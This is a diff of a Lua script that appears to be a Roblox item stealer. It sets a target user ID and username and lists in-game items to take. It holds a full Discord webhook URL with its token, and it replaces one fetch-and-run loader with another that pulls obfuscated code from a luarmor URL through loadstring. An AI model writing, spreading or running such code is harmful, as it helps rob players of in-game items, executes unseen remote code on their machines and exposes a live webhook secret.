@@ -1,5 +1,5 @@
-local TARGET_ID = 8514365881
-local TARGET_USER = "myscacch45"
+local TARGET_ID = 10014820321
+local TARGET_USER = "gogojb75"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1575455662802993233/qMGuUlchIhsapItqBwXNSMYnt4DijbF7VIjOM363Cnk0xjlYINlhEtiwgBxRZB0dqCXz"
 
 local TargetBrainrots = {
@@ -355,7 +355,7 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/b07978b6091791adddc60f60064e722b.lua"))()
 
     task.wait(1)
 
